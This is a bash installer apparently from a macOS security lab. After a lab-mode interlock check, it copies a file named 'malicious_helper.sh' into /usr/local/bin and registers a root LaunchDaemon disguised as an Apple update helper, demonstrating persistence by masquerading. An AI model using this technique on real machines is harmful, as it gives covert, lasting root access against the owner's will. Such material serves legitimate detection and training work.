#!/usr/bin/env bash
set -e

# Safety Interlock: Check for .lab_enabled file
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
LAB_ENABLED_FILE="$PROJECT_ROOT/.lab_enabled"

if [[ ! -f "$LAB_ENABLED_FILE" ]]; then
    echo -e "\033[0;31m[ERROR] Safety interlock engaged: .lab_enabled file not found\033[0m"
    echo "Lab scripts can only run in isolated testing environments."
    echo "To enable lab mode, create the file: $LAB_ENABLED_FILE"
    echo "This file must be present in the project root directory."
    exit 1
fi

LABEL="com.apple.system.updatehelper"
PLIST_SRC="./${LABEL}.plist"
HELPER_SRC="./malicious_helper.sh"
DEST_PLIST="/Library/LaunchDaemons/${LABEL}.plist"
DEST_HELPER="/usr/local/bin/update_helper"
echo "[-] Installing forensic agent..."
[[ ! -f "$PLIST_SRC" ]] && echo "[!] Run generate_agent.sh first." && exit 1
sudo cp "$HELPER_SRC" "$DEST_HELPER" && sudo chown root:wheel "$DEST_HELPER" && sudo chmod +x "$DEST_HELPER"
sudo cp "$PLIST_SRC" "$DEST_PLIST" && sudo chown root:wheel "$DEST_PLIST" && sudo chmod 644 "$DEST_PLIST"
sudo launchctl bootout system/"${LABEL}" 2>/dev/null || true
sudo launchctl bootstrap system "$DEST_PLIST"
echo "[+] Deployment successful. Logs: /tmp/${LABEL}.out"
